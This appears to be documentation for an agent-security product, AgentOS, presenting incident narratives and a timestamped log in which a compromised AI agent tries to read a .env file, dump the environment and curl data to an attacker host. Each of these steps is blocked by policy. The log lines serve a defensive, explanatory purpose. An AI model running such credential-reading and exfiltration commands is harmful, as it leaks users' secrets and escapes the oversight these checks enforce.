# AgentOS Saved Incidents

**Version:** 1.0
**Date:** 2026-04-06

Three narrative examples of AgentOS preventing real-world agent security incidents. Each incident describes the attack, how AgentOS detected and blocked it, and the evidence trail produced.
...
12:04:33 UTC  AgentOS BLOCKS shell.cat targeting .env (sensitive file policy)
12:04:35 UTC  Agent requests: shell.printenv
12:04:35 UTC  AgentOS BLOCKS shell.printenv (environment dump policy)
12:04:37 UTC  Agent requests: shell.curl -X POST https://external-host.attacker.com/collect -d "data"
12:04:37 UTC  AgentOS BLOCKS shell.curl to unauthorized host (network egress policy)
...
All five records are linked in the SHA-256 hash chain. Verification with `agentctl evidence verify --session <id>` confirms the chain is intact and unmodified.
...
These three incidents demonstrate AgentOS's defense-in-depth approach:
...
In all three cases, AgentOS blocked the attack, terminated the session, and produced a verifiable audit trail -- without requiring any manual intervention.
